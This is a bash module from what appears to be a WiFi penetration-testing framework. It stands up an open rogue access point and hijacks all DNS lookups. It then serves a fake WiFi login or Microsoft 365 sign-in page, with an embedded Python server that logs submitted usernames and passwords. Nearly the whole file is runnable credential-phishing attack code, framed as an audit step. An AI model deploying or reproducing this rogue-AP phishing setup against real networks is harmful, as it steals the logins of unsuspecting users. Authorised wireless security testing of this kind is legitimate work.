#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Phishing"
# CATEGORY="F"
# DEPS="F1"
# CRITICAL="no"
# TOOLS="python3,hostapd,dnsmasq"
# DESC="Serve a phishing page to clients connected to the rogue AP"
# REQS="managed_iface,target_ssid,nat"
# PCAP="no"
# TIMED="yes"
# PROMPTS="phishing_template"
# DECODE="http"

#===============================================================================
#  modules/f3_captive_portal.sh
#  F3: Captive Portal Phishing (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Deploy a rogue AP (using tactical template selection from Go brain).
#  2. Redirect all DNS queries to our local IP via dnsmasq.
#  3. Serve a high-fidelity "Authentication Required" page via HTTP.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
_AP_IFACE="${AP_INTERFACE:-}"
if [[ -n "$_AP_IFACE" ]]; then
    INTERFACE="$_AP_IFACE"
else
    INTERFACE="${WIFI_INTERFACE:-}"
fi
SSID="${GUEST_SSID:-GuestWiFi}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/f3"
SCAN_TIME="${SCAN_TIME:-120}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F3"
INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"

# Tactical Selection from Go Brain
PHISH_TEMPLATE="${PHISH_TEMPLATE:-generic}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting Captive Portal mission for SSID: ${C_VAR}${SSID}${C_RESET}..."

# 1. Prepare configurations
PHISH_DIR="${EVIDENCE_PREFIX}_portal"
mkdir -p "$PHISH_DIR"
HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
SERVER_LOG="${EVIDENCE_DIR}/${TC_ID}_server.log"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"

# --- Vendor Fingerprinting: detect existing captive portal before taking over ---
# Probe a captive portal detection URL (Apple/Google CNA URLs) and follow redirects.
# The redirect destination or response body will contain the vendor's portal signature.
echo "[*] Probing for existing captive portal vendor..."
VENDOR_PROBE_TMP="${EVIDENCE_DIR}/F3_vendor_probe.tmp"
curl -siL --max-time 5 http://captive.apple.com/hotspot-detect.html > "${VENDOR_PROBE_TMP}" 2>/dev/null || true
DETECTED_VENDOR="unknown"
if grep -qiE "identityservicesengine|guestportal|sponsorportal|cisco\.com/auth" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="cisco_ise"
elif grep -qiE "clearpass|aruba|onguard" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="aruba_clearpass"
elif grep -qiE "meraki\.com|meraki-splash" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="meraki"
elif grep -qiE "fgtauth|fortigate|fortiap" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="fortigate"
elif grep -qiE "ubnt\.com|unifi|guest/s/" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="unifi"
elif grep -qiE "pfsense|captiveportal" "${VENDOR_PROBE_TMP}"; then
    DETECTED_VENDOR="pfsense"
fi
printf '{"detected_vendor": "%s", "probe_url": "http://captive.apple.com/hotspot-detect.html"}\n' "${DETECTED_VENDOR}" > "${EVIDENCE_DIR}/F3_vendor.json"
echo "[+] Detected vendor: ${DETECTED_VENDOR}"
# Auto-select phishing template from detected vendor (only if still using default)
if [[ "${PHISH_TEMPLATE}" == "generic" ]]; then
    case "${DETECTED_VENDOR}" in
        cisco_ise)       PHISH_TEMPLATE="cisco_ise" ;;
        aruba_clearpass) PHISH_TEMPLATE="aruba" ;;
        meraki)          PHISH_TEMPLATE="meraki" ;;
    esac
    if [[ "${DETECTED_VENDOR}" != "unknown" && "${PHISH_TEMPLATE}" != "generic" ]]; then
        echo "[*] Auto-selected template: ${PHISH_TEMPLATE}"
    fi
fi
rm -f "${VENDOR_PROBE_TMP}"
# --- End vendor fingerprinting ---

if [[ "$PHISH_TEMPLATE" == "m365" ]]; then
    echo -e "[*] Deploying ${C_VAR}Microsoft 365${C_RESET} high-fidelity template..."
    cat <<EOF > "$PHISH_DIR/index.html"
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title>
<style>
    body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; width: 350px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    .logo { width: 100px; margin-bottom: 20px; }
    h1 { font-size: 24px; margin-bottom: 20px; }
    input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; box-sizing: border-box; }
    input[type="submit"] { background: #0067b8; color: white; border: none; cursor: pointer; }
</style>
</head>
<body>
    <div class="login-box">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9623595f45e6a706fdd13424d0.svg" class="logo">
        <h1>Sign in</h1>
        <form action="/login" method="POST">
            <input type="email" name="user" placeholder="Email, phone, or Skype">
            <input type="password" name="pass" placeholder="Password">
            <input type="submit" value="Next">
        </form>
    </div>
</body>
</html>
EOF
else
    echo -e "[*] Deploying ${C_VAR}Generic Corporate${C_RESET} template..."
    cat <<EOF > "$PHISH_DIR/index.html"
<html>
<head><title>WiFi Authentication Required</title></head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
<div style="display: inline-block; border: 1px solid #ccc; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
    <h1>WiFi Login</h1>
    <p>Please log in with your credentials to access the internet.</p>
    <form action="/login" method="POST">
        <input type="text" name="user" placeholder="Username" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
        <input type="password" name="pass" placeholder="Password" style="width: 100%; padding: 10px; margin: 10px 0;"><br>
        <input type="submit" value="Connect" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer;">
    </form>
</div>
</body>
</html>
EOF
fi

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 2. Execution
cleanup() {
    echo -e "${C_PROMPT}[*]${C_RESET} Tearing down Phishing environment..."
    [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null || true
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
}
trap cleanup EXIT

# Start dynamic telemetry heartbeat
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "Captive portal active — ${ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5
            ((ELAPSED+=5))
            continue
        fi
        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
        STATUS="Portal active (waiting for users)... ($(( SCAN_TIME - ELAPSED ))s left)"
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
        sleep 5
        ((ELAPSED+=5))
    done
) &
TEL_PID=$!

echo -e "[*] Starting DNS hijacker..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    dnsmasq -C "$DNSMASQ_CONF" -k 2>&1 | tee "$DNSMASQ_LOG" &
else
    dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
fi
DNSMASQ_PID=$!

echo -e "[*] Starting Rogue AP..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
else
    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
fi
HOSTAPD_PID=$!

echo -e "[*] Starting phishing web server with POST support..."
cat <<EOF > "$PHISH_DIR/server.py"
import http.server, socketserver, sys

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        # Log to stderr so it ends up in SERVER_LOG
        sys.stderr.write(f"\n[!] CREDENTIALS CAPTURED: {post_data.decode('utf-8')}\n")
        sys.stderr.flush()
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Success</h1><p>Connection established. You may now close this window.</p></body></html>")

try:
    socketserver.TCPServer(("", 80), Handler).serve_forever()
except Exception as e:
    sys.stderr.write(f"Server error: {e}\n")
EOF

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # FOREGROUND — python server logs credentials to stderr; 2>&1 captures it in tee
    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
        ( cd "$PHISH_DIR" && python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
    else
        ( cd "$PHISH_DIR" && timeout --foreground "$SCAN_TIME" python3 server.py 2>&1 | tee "$SERVER_LOG" || true )
    fi
else
    # BACKGROUND
    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
        ( cd "$PHISH_DIR" && python3 server.py > "$SERVER_LOG" 2>&1 ) &
    else
        ( cd "$PHISH_DIR" && timeout "$SCAN_TIME" python3 server.py > "$SERVER_LOG" 2>&1 ) &
    fi
    HTTP_PID=$!
    wait "$HTTP_PID" 2>/dev/null || true
fi

cleanup
trap - EXIT

# 4. Reporting
if grep -qi "CREDENTIALS CAPTURED" "$SERVER_LOG" 2>/dev/null; then
    echo -e "[!] ${C_BOLD}SUCCESS: USER SUBMITTED DATA TO CAPTIVE PORTAL!${C_RESET}"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Phishing Credential Harvest" \
        --severity CRITICAL \
        --desc "A user submitted credentials to the rogue captive portal template ($PHISH_TEMPLATE)." \
        --target "$SSID" \
        --evidence "$SERVER_LOG" \
        --rationale "Captive portal phishing is a highly effective fallback attack when technical encryption cannot be breached."
else
    echo -e "[+] Mission complete. No data harvested."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F3] Audit Complete" \
        --severity INFO \
        --desc "Captive portal phishing page deployed for SSID '$SSID' — no credentials submitted during test window." \
        --target "$SSID" \
        --evidence "$SERVER_LOG" \
        --rationale "No user interaction observed. The portal was reachable but no credentials were entered."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
